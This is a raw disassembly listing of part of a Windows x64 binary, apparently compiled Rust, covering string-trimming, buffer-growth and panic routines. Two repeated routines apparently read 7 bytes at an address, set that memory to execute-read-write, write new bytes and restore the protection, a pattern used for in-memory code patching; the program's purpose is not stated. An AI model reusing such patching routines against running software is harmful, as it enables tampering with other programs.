   140003749:	44 0f b6 78 0b       	movzbl 0xb(%rax),%r15d
   14000374e:	c6 44 24 36 00       	movb   $0x0,0x36(%rsp)
   140003753:	66 c7 44 24 34 00 00 	movw   $0x0,0x34(%rsp)
   14000375a:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140003761:	00 
   140003762:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003769:	00 00 
   14000376b:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003770:	41 b9 07 00 00 00    	mov    $0x7,%r9d
   140003776:	48 89 d9             	mov    %rbx,%rcx
   140003779:	48 89 fa             	mov    %rdi,%rdx
   14000377c:	e8 f1 af 01 00       	call   0x14001e772
   140003781:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140003785:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000378a:	44 0f b6 64 24 36    	movzbl 0x36(%rsp),%r12d
   140003790:	44 0f b7 6c 24 34    	movzwl 0x34(%rsp),%r13d
   140003796:	44 88 7c 24 36       	mov    %r15b,0x36(%rsp)
   14000379b:	66 44 89 74 24 34    	mov    %r14w,0x34(%rsp)
   1400037a1:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   1400037a5:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
   1400037ac:	00 
   1400037ad:	48 8d 6c 24 3c       	lea    0x3c(%rsp),%rbp
   1400037b2:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400037b7:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   1400037bd:	48 89 d9             	mov    %rbx,%rcx
   1400037c0:	48 89 fa             	mov    %rdi,%rdx
   1400037c3:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1400037c9:	e8 98 af 01 00       	call   0x14001e766
   1400037ce:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400037d5:	00 00 
   1400037d7:	41 b9 07 00 00 00    	mov    $0x7,%r9d
   1400037dd:	48 89 d9             	mov    %rbx,%rcx
   1400037e0:	48 89 fa             	mov    %rdi,%rdx
   1400037e3:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400037e8:	e8 7f af 01 00       	call   0x14001e76c
   1400037ed:	44 8b 4c 24 3c       	mov    0x3c(%rsp),%r9d
   1400037f2:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400037f7:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   1400037fd:	48 89 d9             	mov    %rbx,%rcx
   140003800:	48 89 fa             	mov    %rdi,%rdx
   140003803:	e8 5e af 01 00       	call   0x14001e766
   140003808:	48 8b 06             	mov    (%rsi),%rax
   14000380b:	44 88 60 0b          	mov    %r12b,0xb(%rax)
   14000380f:	66 44 89 68 09       	mov    %r13w,0x9(%rax)
   140003814:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003819:	89 48 05             	mov    %ecx,0x5(%rax)
   14000381c:	48 83 c4 48          	add    $0x48,%rsp
   140003820:	5b                   	pop    %rbx
   140003821:	5d                   	pop    %rbp
   140003822:	5f                   	pop    %rdi
   140003823:	5e                   	pop    %rsi
   140003824:	41 5c                	pop    %r12
   140003826:	41 5d                	pop    %r13
   140003828:	41 5e                	pop    %r14
   14000382a:	41 5f                	pop    %r15
   14000382c:	c3                   	ret
   14000382d:	4c 8d 05 ac e0 01 00 	lea    0x1e0ac(%rip),%r8        # 0x1400218e0
   140003834:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003839:	48 89 c2             	mov    %rax,%rdx
   14000383c:	e8 3f c2 01 00       	call   0x14001fa80
   140003841:	0f 0b                	ud2
   140003843:	cc                   	int3
   140003844:	cc                   	int3
   140003845:	cc                   	int3
   140003846:	cc                   	int3
   140003847:	cc                   	int3
   140003848:	cc                   	int3
   140003849:	cc                   	int3
   14000384a:	cc                   	int3
   14000384b:	cc                   	int3
   14000384c:	cc                   	int3
   14000384d:	cc                   	int3
   14000384e:	cc                   	int3
   14000384f:	cc                   	int3
   140003850:	41 57                	push   %r15
   140003852:	41 56                	push   %r14
   140003854:	41 55                	push   %r13
   140003856:	41 54                	push   %r12
   140003858:	56                   	push   %rsi
   140003859:	57                   	push   %rdi
   14000385a:	55                   	push   %rbp
   14000385b:	53                   	push   %rbx
   14000385c:	48 83 ec 48          	sub    $0x48,%rsp
   140003860:	49 8b 41 10          	mov    0x10(%r9),%rax
   140003864:	48 83 f8 02          	cmp    $0x2,%rax
   140003868:	0f 86 ff 00 00 00    	jbe    0x14000396d
   14000386e:	48 89 ce             	mov    %rcx,%rsi
   140003871:	49 8b 01             	mov    (%r9),%rax
   140003874:	48 8b 78 10          	mov    0x10(%rax),%rdi
   140003878:	49 03 38             	add    (%r8),%rdi
   14000387b:	48 8b 1a             	mov    (%rdx),%rbx
   14000387e:	48 8b 01             	mov    (%rcx),%rax
   140003881:	8b 68 05             	mov    0x5(%rax),%ebp
   140003884:	44 0f b7 70 09       	movzwl 0x9(%rax),%r14d
   140003889:	44 0f b6 78 0b       	movzbl 0xb(%rax),%r15d
   14000388e:	c6 44 24 36 00       	movb   $0x0,0x36(%rsp)
   140003893:	66 c7 44 24 34 00 00 	movw   $0x0,0x34(%rsp)
   14000389a:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   1400038a1:	00 
   1400038a2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400038a9:	00 00 
   1400038ab:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400038b0:	41 b9 07 00 00 00    	mov    $0x7,%r9d
   1400038b6:	48 89 d9             	mov    %rbx,%rcx
   1400038b9:	48 89 fa             	mov    %rdi,%rdx
   1400038bc:	e8 b1 ae 01 00       	call   0x14001e772
   1400038c1:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400038c5:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400038ca:	44 0f b6 64 24 36    	movzbl 0x36(%rsp),%r12d
   1400038d0:	44 0f b7 6c 24 34    	movzwl 0x34(%rsp),%r13d
   1400038d6:	44 88 7c 24 36       	mov    %r15b,0x36(%rsp)
   1400038db:	66 44 89 74 24 34    	mov    %r14w,0x34(%rsp)
   1400038e1:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   1400038e5:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
   1400038ec:	00 
   1400038ed:	48 8d 6c 24 3c       	lea    0x3c(%rsp),%rbp
   1400038f2:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400038f7:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   1400038fd:	48 89 d9             	mov    %rbx,%rcx
   140003900:	48 89 fa             	mov    %rdi,%rdx
   140003903:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140003909:	e8 58 ae 01 00       	call   0x14001e766
   14000390e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003915:	00 00 
   140003917:	41 b9 07 00 00 00    	mov    $0x7,%r9d
   14000391d:	48 89 d9             	mov    %rbx,%rcx
   140003920:	48 89 fa             	mov    %rdi,%rdx
   140003923:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003928:	e8 3f ae 01 00       	call   0x14001e76c
   14000392d:	44 8b 4c 24 3c       	mov    0x3c(%rsp),%r9d
   140003932:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003937:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   14000393d:	48 89 d9             	mov    %rbx,%rcx
   140003940:	48 89 fa             	mov    %rdi,%rdx
   140003943:	e8 1e ae 01 00       	call   0x14001e766
   140003948:	48 8b 06             	mov    (%rsi),%rax
   14000394b:	44 88 60 0b          	mov    %r12b,0xb(%rax)
   14000394f:	66 44 89 68 09       	mov    %r13w,0x9(%rax)
   140003954:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003959:	89 48 05             	mov    %ecx,0x5(%rax)
   14000395c:	48 83 c4 48          	add    $0x48,%rsp
   140003960:	5b                   	pop    %rbx
   140003961:	5d                   	pop    %rbp
   140003962:	5f                   	pop    %rdi
   140003963:	5e                   	pop    %rsi
   140003964:	41 5c                	pop    %r12
   140003966:	41 5d                	pop    %r13
   140003968:	41 5e                	pop    %r14
   14000396a:	41 5f                	pop    %r15
   14000396c:	c3                   	ret
   14000396d:	4c 8d 05 84 df 01 00 	lea    0x1df84(%rip),%r8        # 0x1400218f8
   140003974:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003979:	48 89 c2             	mov    %rax,%rdx
   14000397c:	e8 ff c0 01 00       	call   0x14001fa80
   140003981:	0f 0b                	ud2
   140003983:	cc                   	int3
   140003984:	cc                   	int3
   140003985:	cc                   	int3
   140003986:	cc                   	int3
   140003987:	cc                   	int3
   140003988:	cc                   	int3
   140003989:	cc                   	int3
   14000398a:	cc                   	int3
   14000398b:	cc                   	int3
   14000398c:	cc                   	int3
   14000398d:	cc                   	int3
   14000398e:	cc                   	int3
   14000398f:	cc                   	int3
   140003990:	41 57                	push   %r15
   140003992:	41 56                	push   %r14
   140003994:	41 55                	push   %r13
   140003996:	41 54                	push   %r12
   140003998:	56                   	push   %rsi
   140003999:	57                   	push   %rdi
   14000399a:	55                   	push   %rbp
   14000399b:	53                   	push   %rbx
   14000399c:	48 83 ec 28          	sub    $0x28,%rsp
   1400039a0:	49 89 cf             	mov    %rcx,%r15
   1400039a3:	48 8d 3c 11          	lea    (%rcx,%rdx,1),%rdi
   1400039a7:	45 31 f6             	xor    %r14d,%r14d
   1400039aa:	48 85 d2             	test   %rdx,%rdx
   1400039ad:	0f 84 20 01 00 00    	je     0x140003ad3
   1400039b3:	31 ed                	xor    %ebp,%ebp
   1400039b5:	4c 89 f8             	mov    %r15,%rax
   1400039b8:	eb 12                	jmp    0x1400039cc
   1400039ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400039c0:	48 89 d8             	mov    %rbx,%rax
   1400039c3:	48 39 fb             	cmp    %rdi,%rbx
   1400039c6:	0f 84 0c 01 00 00    	je     0x140003ad8
   1400039cc:	49 89 ec             	mov    %rbp,%r12
   1400039cf:	4c 8d 68 01          	lea    0x1(%rax),%r13
   1400039d3:	0f b6 18             	movzbl (%rax),%ebx
   1400039d6:	0f b6 cb             	movzbl %bl,%ecx
   1400039d9:	84 c9                	test   %cl,%cl
   1400039db:	78 13                	js     0x1400039f0
   1400039dd:	4c 89 eb             	mov    %r13,%rbx
   1400039e0:	e9 ab 00 00 00       	jmp    0x140003a90
   1400039e5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400039ec:	00 00 00 
   1400039ef:	90                   	nop
   1400039f0:	49 39 fd             	cmp    %rdi,%r13
   1400039f3:	74 46                	je     0x140003a3b
   1400039f5:	4c 8d 68 02          	lea    0x2(%rax),%r13
   1400039f9:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   1400039fd:	83 e2 3f             	and    $0x3f,%edx
   140003a00:	89 cd                	mov    %ecx,%ebp
   140003a02:	83 e5 1f             	and    $0x1f,%ebp
   140003a05:	80 f9 e0             	cmp    $0xe0,%cl
   140003a08:	72 40                	jb     0x140003a4a
   140003a0a:	49 39 fd             	cmp    %rdi,%r13
   140003a0d:	74 40                	je     0x140003a4f
   140003a0f:	41 0f b6 4d 00       	movzbl 0x0(%r13),%ecx
   140003a14:	49 83 c5 01          	add    $0x1,%r13
   140003a18:	83 e1 3f             	and    $0x3f,%ecx
   140003a1b:	c1 e2 06             	shl    $0x6,%edx
   140003a1e:	09 ca                	or     %ecx,%edx
   140003a20:	80 fb f0             	cmp    $0xf0,%bl
   140003a23:	72 39                	jb     0x140003a5e
   140003a25:	49 39 fd             	cmp    %rdi,%r13
   140003a28:	74 40                	je     0x140003a6a
   140003a2a:	41 0f b6 75 00       	movzbl 0x0(%r13),%esi
   140003a2f:	49 83 c5 01          	add    $0x1,%r13
   140003a33:	83 e6 3f             	and    $0x3f,%esi
   140003a36:	4c 89 eb             	mov    %r13,%rbx
   140003a39:	eb 34                	jmp    0x140003a6f
   140003a3b:	31 d2                	xor    %edx,%edx
   140003a3d:	49 89 fd             	mov    %rdi,%r13
   140003a40:	89 cd                	mov    %ecx,%ebp
   140003a42:	83 e5 1f             	and    $0x1f,%ebp
   140003a45:	80 f9 e0             	cmp    $0xe0,%cl
   140003a48:	73 c0                	jae    0x140003a0a
   140003a4a:	c1 e5 06             	shl    $0x6,%ebp
   140003a4d:	eb 12                	jmp    0x140003a61
   140003a4f:	31 c9                	xor    %ecx,%ecx
   140003a51:	49 89 fd             	mov    %rdi,%r13
   140003a54:	c1 e2 06             	shl    $0x6,%edx
   140003a57:	09 ca                	or     %ecx,%edx
   140003a59:	80 fb f0             	cmp    $0xf0,%bl
   140003a5c:	73 c7                	jae    0x140003a25
   140003a5e:	c1 e5 0c             	shl    $0xc,%ebp
   140003a61:	09 ea                	or     %ebp,%edx
   140003a63:	4c 89 eb             	mov    %r13,%rbx
   140003a66:	89 d1                	mov    %edx,%ecx
   140003a68:	eb 26                	jmp    0x140003a90
   140003a6a:	31 f6                	xor    %esi,%esi
   140003a6c:	48 89 fb             	mov    %rdi,%rbx
   140003a6f:	83 e5 07             	and    $0x7,%ebp
   140003a72:	c1 e5 12             	shl    $0x12,%ebp
   140003a75:	c1 e2 06             	shl    $0x6,%edx
   140003a78:	09 ea                	or     %ebp,%edx
   140003a7a:	89 d1                	mov    %edx,%ecx
   140003a7c:	09 f1                	or     %esi,%ecx
   140003a7e:	81 f9 00 00 11 00    	cmp    $0x110000,%ecx
   140003a84:	0f 84 68 01 00 00    	je     0x140003bf2
   140003a8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003a90:	48 89 dd             	mov    %rbx,%rbp
   140003a93:	48 29 c5             	sub    %rax,%rbp
   140003a96:	4c 01 e5             	add    %r12,%rbp
   140003a99:	8d 41 f7             	lea    -0x9(%rcx),%eax
   140003a9c:	83 f8 05             	cmp    $0x5,%eax
   140003a9f:	0f 82 1b ff ff ff    	jb     0x1400039c0
   140003aa5:	83 f9 20             	cmp    $0x20,%ecx
   140003aa8:	0f 84 12 ff ff ff    	je     0x1400039c0
   140003aae:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
   140003ab4:	72 10                	jb     0x140003ac6
   140003ab6:	e8 65 ab 01 00       	call   0x14001e620
   140003abb:	4c 89 eb             	mov    %r13,%rbx
   140003abe:	84 c0                	test   %al,%al
   140003ac0:	0f 85 fa fe ff ff    	jne    0x1400039c0
   140003ac6:	49 89 ee             	mov    %rbp,%r14
   140003ac9:	49 39 fd             	cmp    %rdi,%r13
   140003acc:	75 16                	jne    0x140003ae4
   140003ace:	e9 02 01 00 00       	jmp    0x140003bd5
   140003ad3:	4d 89 fd             	mov    %r15,%r13
   140003ad6:	31 ed                	xor    %ebp,%ebp
   140003ad8:	45 31 e4             	xor    %r12d,%r12d
   140003adb:	49 39 fd             	cmp    %rdi,%r13
   140003ade:	0f 84 f1 00 00 00    	je     0x140003bd5
   140003ae4:	48 89 fe             	mov    %rdi,%rsi
   140003ae7:	4c 29 ee             	sub    %r13,%rsi
   140003aea:	eb 10                	jmp    0x140003afc
   140003aec:	0f 1f 40 00          	nopl   0x0(%rax)
   140003af0:	48 89 fe             	mov    %rdi,%rsi
   140003af3:	4c 29 ee             	sub    %r13,%rsi
   140003af6:	0f 84 d9 00 00 00    	je     0x140003bd5
   140003afc:	48 8d 57 ff          	lea    -0x1(%rdi),%rdx
   140003b00:	0f b6 47 ff          	movzbl -0x1(%rdi),%eax
   140003b04:	84 c0                	test   %al,%al
   140003b06:	78 18                	js     0x140003b20
   140003b08:	0f b6 c8             	movzbl %al,%ecx
   140003b0b:	48 89 d7             	mov    %rdx,%rdi
   140003b0e:	e9 92 00 00 00       	jmp    0x140003ba5
   140003b13:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003b1a:	00 00 00 
   140003b1d:	0f 1f 00             	nopl   (%rax)
   140003b20:	49 39 d5             	cmp    %rdx,%r13
   140003b23:	74 41                	je     0x140003b66
   140003b25:	4c 8d 47 fe          	lea    -0x2(%rdi),%r8
   140003b29:	0f b6 57 fe          	movzbl -0x2(%rdi),%edx
   140003b2d:	89 d1                	mov    %edx,%ecx
   140003b2f:	80 e1 c0             	and    $0xc0,%cl
   140003b32:	80 f9 80             	cmp    $0x80,%cl
   140003b35:	75 36                	jne    0x140003b6d
   140003b37:	4d 39 c5             	cmp    %r8,%r13
   140003b3a:	74 36                	je     0x140003b72
   140003b3c:	4c 8d 47 fd          	lea    -0x3(%rdi),%r8
   140003b40:	0f b6 4f fd          	movzbl -0x3(%rdi),%ecx
   140003b44:	89 cb                	mov    %ecx,%ebx
   140003b46:	80 e3 c0             	and    $0xc0,%bl
   140003b49:	80 fb 80             	cmp    $0x80,%bl
   140003b4c:	75 2b                	jne    0x140003b79
   140003b4e:	4d 39 c5             	cmp    %r8,%r13
   140003b51:	74 2b                	je     0x140003b7e
   140003b53:	0f b6 5f fc          	movzbl -0x4(%rdi),%ebx
   140003b57:	48 83 c7 fc          	add    $0xfffffffffffffffc,%rdi
   140003b5b:	83 e3 07             	and    $0x7,%ebx
   140003b5e:	c1 e3 06             	shl    $0x6,%ebx
   140003b61:	49 89 f8             	mov    %rdi,%r8
   140003b64:	eb 1d                	jmp    0x140003b83
   140003b66:	31 d2                	xor    %edx,%edx
   140003b68:	4d 89 e8             	mov    %r13,%r8
   140003b6b:	eb 23                	jmp    0x140003b90
   140003b6d:	83 e2 1f             	and    $0x1f,%edx
   140003b70:	eb 1e                	jmp    0x140003b90
   140003b72:	31 c9                	xor    %ecx,%ecx
   140003b74:	4d 89 e8             	mov    %r13,%r8
   140003b77:	eb 0f                	jmp    0x140003b88
   140003b79:	83 e1 0f             	and    $0xf,%ecx
   140003b7c:	eb 0a                	jmp    0x140003b88
   140003b7e:	31 db                	xor    %ebx,%ebx
   140003b80:	4d 89 e8             	mov    %r13,%r8
   140003b83:	83 e1 3f             	and    $0x3f,%ecx
   140003b86:	09 d9                	or     %ebx,%ecx
   140003b88:	c1 e1 06             	shl    $0x6,%ecx
   140003b8b:	83 e2 3f             	and    $0x3f,%edx
   140003b8e:	09 ca                	or     %ecx,%edx
   140003b90:	c1 e2 06             	shl    $0x6,%edx
   140003b93:	24 3f                	and    $0x3f,%al
   140003b95:	0f b6 c8             	movzbl %al,%ecx
   140003b98:	09 d1                	or     %edx,%ecx
   140003b9a:	4c 89 c7             	mov    %r8,%rdi
   140003b9d:	81 f9 00 00 11 00    	cmp    $0x110000,%ecx
   140003ba3:	74 30                	je     0x140003bd5
   140003ba5:	8d 41 f7             	lea    -0x9(%rcx),%eax
   140003ba8:	83 f8 05             	cmp    $0x5,%eax
   140003bab:	0f 82 3f ff ff ff    	jb     0x140003af0
   140003bb1:	83 f9 20             	cmp    $0x20,%ecx
   140003bb4:	0f 84 36 ff ff ff    	je     0x140003af0
   140003bba:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
   140003bc0:	72 0d                	jb     0x140003bcf
   140003bc2:	e8 59 aa 01 00       	call   0x14001e620
   140003bc7:	84 c0                	test   %al,%al
   140003bc9:	0f 85 21 ff ff ff    	jne    0x140003af0
   140003bcf:	48 01 ee             	add    %rbp,%rsi
   140003bd2:	49 89 f6             	mov    %rsi,%r14
   140003bd5:	4d 01 e7             	add    %r12,%r15
   140003bd8:	4d 29 e6             	sub    %r12,%r14
   140003bdb:	4c 89 f8             	mov    %r15,%rax
   140003bde:	4c 89 f2             	mov    %r14,%rdx
   140003be1:	48 83 c4 28          	add    $0x28,%rsp
   140003be5:	5b                   	pop    %rbx
   140003be6:	5d                   	pop    %rbp
   140003be7:	5f                   	pop    %rdi
   140003be8:	5e                   	pop    %rsi
   140003be9:	41 5c                	pop    %r12
   140003beb:	41 5d                	pop    %r13
   140003bed:	41 5e                	pop    %r14
   140003bef:	41 5f                	pop    %r15
   140003bf1:	c3                   	ret
   140003bf2:	4c 89 e5             	mov    %r12,%rbp
   140003bf5:	45 31 e4             	xor    %r12d,%r12d
   140003bf8:	49 39 fd             	cmp    %rdi,%r13
   140003bfb:	0f 85 e3 fe ff ff    	jne    0x140003ae4
   140003c01:	eb d2                	jmp    0x140003bd5
   140003c03:	cc                   	int3
   140003c04:	cc                   	int3
   140003c05:	cc                   	int3
   140003c06:	cc                   	int3
   140003c07:	cc                   	int3
   140003c08:	cc                   	int3
   140003c09:	cc                   	int3
   140003c0a:	cc                   	int3
   140003c0b:	cc                   	int3
   140003c0c:	cc                   	int3
   140003c0d:	cc                   	int3
   140003c0e:	cc                   	int3
   140003c0f:	cc                   	int3
   140003c10:	31 c0                	xor    %eax,%eax
   140003c12:	c3                   	ret
   140003c13:	cc                   	int3
   140003c14:	cc                   	int3
   140003c15:	cc                   	int3
   140003c16:	cc                   	int3
   140003c17:	cc                   	int3
   140003c18:	cc                   	int3
   140003c19:	cc                   	int3
   140003c1a:	cc                   	int3
   140003c1b:	cc                   	int3
   140003c1c:	cc                   	int3
   140003c1d:	cc                   	int3
   140003c1e:	cc                   	int3
   140003c1f:	cc                   	int3
   140003c20:	48 b8 80 86 8d d7 d7 	movabs $0x63161ad7d78d8680,%rax
   140003c27:	1a 16 63 
   140003c2a:	c3                   	ret
   140003c2b:	cc                   	int3
   140003c2c:	cc                   	int3
   140003c2d:	cc                   	int3
   140003c2e:	cc                   	int3
   140003c2f:	cc                   	int3
   140003c30:	56                   	push   %rsi
   140003c31:	57                   	push   %rdi
   140003c32:	53                   	push   %rbx
   140003c33:	48 83 ec 20          	sub    $0x20,%rsp
   140003c37:	48 89 d7             	mov    %rdx,%rdi
   140003c3a:	48 89 ce             	mov    %rcx,%rsi
   140003c3d:	4d 85 c0             	test   %r8,%r8
   140003c40:	74 26                	je     0x140003c68
   140003c42:	4c 89 c3             	mov    %r8,%rbx
   140003c45:	49 8b 09             	mov    (%r9),%rcx
   140003c48:	48 85 c9             	test   %rcx,%rcx
   140003c4b:	74 28                	je     0x140003c75
   140003c4d:	49 8b 51 08          	mov    0x8(%r9),%rdx
   140003c51:	48 85 d2             	test   %rdx,%rdx
   140003c54:	74 1f                	je     0x140003c75
   140003c56:	49 89 d8             	mov    %rbx,%r8
   140003c59:	49 89 f9             	mov    %rdi,%r9
   140003c5c:	e8 cf 11 00 00       	call   0x140004e30
   140003c61:	48 85 c0             	test   %rax,%rax
   140003c64:	75 35                	jne    0x140003c9b
   140003c66:	eb 22                	jmp    0x140003c8a
   140003c68:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
   140003c6c:	b8 01 00 00 00       	mov    $0x1,%eax
   140003c71:	31 ff                	xor    %edi,%edi
   140003c73:	eb 2c                	jmp    0x140003ca1
   140003c75:	48 85 ff             	test   %rdi,%rdi
   140003c78:	74 1e                	je     0x140003c98
   140003c7a:	48 89 f9             	mov    %rdi,%rcx
   140003c7d:	48 89 da             	mov    %rbx,%rdx
   140003c80:	e8 8b 11 00 00       	call   0x140004e10
   140003c85:	48 85 c0             	test   %rax,%rax
   140003c88:	75 11                	jne    0x140003c9b
   140003c8a:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
   140003c8e:	b8 01 00 00 00       	mov    $0x1,%eax
   140003c93:	48 89 df             	mov    %rbx,%rdi
   140003c96:	eb 09                	jmp    0x140003ca1
   140003c98:	48 89 d8             	mov    %rbx,%rax
   140003c9b:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140003c9f:	31 c0                	xor    %eax,%eax
   140003ca1:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   140003ca5:	48 89 06             	mov    %rax,(%rsi)
   140003ca8:	48 83 c4 20          	add    $0x20,%rsp
   140003cac:	5b                   	pop    %rbx
   140003cad:	5f                   	pop    %rdi
   140003cae:	5e                   	pop    %rsi
   140003caf:	c3                   	ret
   140003cb0:	56                   	push   %rsi
   140003cb1:	48 83 ec 20          	sub    $0x20,%rsp
   140003cb5:	48 89 ce             	mov    %rcx,%rsi
   140003cb8:	84 d2                	test   %dl,%dl
   140003cba:	74 14                	je     0x140003cd0
   140003cbc:	48 85 f6             	test   %rsi,%rsi
   140003cbf:	74 35                	je     0x140003cf6
   140003cc1:	ba 01 00 00 00       	mov    $0x1,%edx
   140003cc6:	48 89 f1             	mov    %rsi,%rcx
   140003cc9:	e8 72 11 00 00       	call   0x140004e40
   140003cce:	eb 12                	jmp    0x140003ce2
   140003cd0:	48 85 f6             	test   %rsi,%rsi
   140003cd3:	74 21                	je     0x140003cf6
   140003cd5:	ba 01 00 00 00       	mov    $0x1,%edx
   140003cda:	48 89 f1             	mov    %rsi,%rcx
   140003cdd:	e8 2e 11 00 00       	call   0x140004e10
   140003ce2:	48 85 c0             	test   %rax,%rax
   140003ce5:	75 14                	jne    0x140003cfb
   140003ce7:	ba 01 00 00 00       	mov    $0x1,%edx
   140003cec:	48 89 f1             	mov    %rsi,%rcx
   140003cef:	e8 1c bc 01 00       	call   0x14001f910
   140003cf4:	0f 0b                	ud2
   140003cf6:	b8 01 00 00 00       	mov    $0x1,%eax
   140003cfb:	48 89 f2             	mov    %rsi,%rdx
   140003cfe:	48 83 c4 20          	add    $0x20,%rsp
   140003d02:	5e                   	pop    %rsi
   140003d03:	c3                   	ret
   140003d04:	cc                   	int3
   140003d05:	cc                   	int3
   140003d06:	cc                   	int3
   140003d07:	cc                   	int3
   140003d08:	cc                   	int3
   140003d09:	cc                   	int3
   140003d0a:	cc                   	int3
   140003d0b:	cc                   	int3
   140003d0c:	cc                   	int3
   140003d0d:	cc                   	int3
   140003d0e:	cc                   	int3
   140003d0f:	cc                   	int3
   140003d10:	56                   	push   %rsi
   140003d11:	48 83 ec 50          	sub    $0x50,%rsp
   140003d15:	48 89 d0             	mov    %rdx,%rax
   140003d18:	48 89 ce             	mov    %rcx,%rsi
   140003d1b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003d1f:	48 89 ca             	mov    %rcx,%rdx
   140003d22:	48 29 c2             	sub    %rax,%rdx
   140003d25:	4c 39 c2             	cmp    %r8,%rdx
   140003d28:	73 71                	jae    0x140003d9b
   140003d2a:	4c 01 c0             	add    %r8,%rax
   140003d2d:	72 77                	jb     0x140003da6
   140003d2f:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
   140003d33:	48 39 c2             	cmp    %rax,%rdx
   140003d36:	48 0f 47 c2          	cmova  %rdx,%rax
   140003d3a:	48 83 f8 08          	cmp    $0x8,%rax
   140003d3e:	ba 08 00 00 00       	mov    $0x8,%edx
   140003d43:	48 0f 47 d0          	cmova  %rax,%rdx
   140003d47:	48 85 c9             	test   %rcx,%rcx
   140003d4a:	74 18                	je     0x140003d64
   140003d4c:	48 8b 06             	mov    (%rsi),%rax
   140003d4f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003d54:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003d59:	48 c7 44 24 30 01 00 	movq   $0x1,0x30(%rsp)
   140003d60:	00 00 
   140003d62:	eb 09                	jmp    0x140003d6d
   140003d64:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003d6b:	00 00 
   140003d6d:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140003d72:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140003d77:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003d7d:	e8 ae fe ff ff       	call   0x140003c30
   140003d82:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003d87:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003d8c:	48 83 7c 24 38 01    	cmpq   $0x1,0x38(%rsp)
   140003d92:	74 0d                	je     0x140003da1
   140003d94:	48 89 0e             	mov    %rcx,(%rsi)
   140003d97:	48 89 56 08          	mov    %rdx,0x8(%rsi)
   140003d9b:	48 83 c4 50          	add    $0x50,%rsp
   140003d9f:	5e                   	pop    %rsi
   140003da0:	c3                   	ret
   140003da1:	48 85 d2             	test   %rdx,%rdx
   140003da4:	75 07                	jne    0x140003dad
   140003da6:	e8 75 58 01 00       	call   0x140019620
   140003dab:	0f 0b                	ud2
   140003dad:	e8 5e bb 01 00       	call   0x14001f910
   140003db2:	0f 0b                	ud2
   140003db4:	cc                   	int3
   140003db5:	cc                   	int3
   140003db6:	cc                   	int3
   140003db7:	cc                   	int3
   140003db8:	cc                   	int3
   140003db9:	cc                   	int3
   140003dba:	cc                   	int3
   140003dbb:	cc                   	int3
   140003dbc:	cc                   	int3
   140003dbd:	cc                   	int3
   140003dbe:	cc                   	int3
   140003dbf:	cc                   	int3
   140003dc0:	56                   	push   %rsi
   140003dc1:	48 83 ec 50          	sub    $0x50,%rsp
   140003dc5:	48 89 ce             	mov    %rcx,%rsi
   140003dc8:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003dcc:	48 89 c8             	mov    %rcx,%rax
   140003dcf:	48 29 d0             	sub    %rdx,%rax
   140003dd2:	4c 39 c0             	cmp    %r8,%rax
   140003dd5:	0f 83 8d 00 00 00    	jae    0x140003e68
   140003ddb:	4c 01 c2             	add    %r8,%rdx
   140003dde:	0f 82 8f 00 00 00    	jb     0x140003e73
   140003de4:	48 8d 04 09          	lea    (%rcx,%rcx,1),%rax
   140003de8:	48 39 d0             	cmp    %rdx,%rax
   140003deb:	48 0f 47 d0          	cmova  %rax,%rdx
   140003def:	48 83 fa 04          	cmp    $0x4,%rdx
   140003df3:	b8 04 00 00 00       	mov    $0x4,%eax
   140003df8:	48 0f 47 c2          	cmova  %rdx,%rax
   140003dfc:	ba 08 00 00 00       	mov    $0x8,%edx
